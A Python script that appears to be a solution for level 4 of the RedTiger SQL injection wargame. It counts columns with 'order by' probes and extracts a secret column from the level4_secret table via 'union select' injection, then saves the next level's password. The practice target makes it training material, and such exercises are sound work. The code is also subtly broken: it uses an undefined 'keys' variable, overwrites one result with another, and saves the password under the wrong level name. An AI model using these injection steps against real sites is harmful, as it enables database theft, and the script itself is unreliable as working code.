#!/usr/bin/env python3
import pickle
import tigers as tg


def main():
    base_name = 'level4_secret'
    url = "https://redtiger.labs.overthewire.org/level4.php"
    finds = 'keyword'  # What we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level4login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level4login=cooks['level4login'])

    # Counting the number of columns
    columns = tg.count_columns(url, '1 order by %s', 'id', cook)
    list_of_columns = [str(c + 1) for c in range(columns)]

    # Find position of 'keyword' column
    index_of_key = tg.find_column_position(url, list_of_columns,
                                           f"1 union select %s from {base_name}",
                                           'id', finds, cook)

    # Find len of key
    index_of_key = tg.find_key_len(url, list_of_columns,
                                   f"1 union select %s from {base_name}",
                                   'id', finds, cook)

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = tg.get_request(url, data, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if ('level5login' not in cooks) or (cooks['level5login'] != passw):
            cooks['level5login'] = passw
            tg.save_cookies(cooks)
    except:
        cooks = dict(level2login=passw)
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
